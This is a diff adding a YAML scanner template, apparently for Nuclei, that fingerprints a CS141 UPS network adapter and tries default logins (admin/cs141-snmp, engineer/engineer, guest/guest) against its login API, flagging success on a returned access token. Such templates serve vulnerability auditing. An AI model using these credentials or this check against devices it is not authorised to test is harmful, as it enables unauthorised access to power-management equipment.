@@ -1,0 +1,66 @@
+id: poc-yaml-ups-adapter-cs141-snmp-default-login
+info:
+  name: UPS Adapter CS141 SNMP Default Login
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: weak-passwords
+
+variables:
+  user:
+    - admin
+    - engineer
+    - guest
+  passwd:
+    - cs141-snmp
+    - engineer
+    - guest
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "CS141"
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/login"
+    headers:
+      Content-Type: application/json
+    body: |-
+      {"userName":"{{user}}","password":"{{passwd}}"}
+    attack: pitchfork
+    payloads:
+      user:
+        - admin
+        - engineer
+        - guest
+      passwd:
+        - cs141-snmp
+        - engineer
+        - guest
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "accessToken"
+          - "AdminFirstTime"
+      - type: regex
+        part: body
+        regex:
+          - "^[^<]+$"
+      - type: word
+        part: header
+        words:
+          - "application/json"
